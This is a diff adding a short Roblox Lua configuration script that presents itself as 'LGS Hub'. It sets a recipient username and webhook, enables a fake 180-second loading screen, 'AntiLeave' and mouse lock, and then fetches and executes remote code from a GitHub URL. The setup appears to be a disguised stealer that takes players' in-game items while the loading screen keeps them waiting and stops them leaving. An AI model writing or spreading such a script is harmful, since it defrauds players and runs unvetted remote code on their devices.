@@ -1,0 +1,18 @@
+
+UserName = "PsxAltGo"
+Webhook = " "
+UserName2 = "PsxAltGo"
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+-- Remove These If You're Not Using The Rizz LoadingScreen
+
+_G.ScriptName = "LGS Hub"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScriptsW/testing/main/ongfr"))()
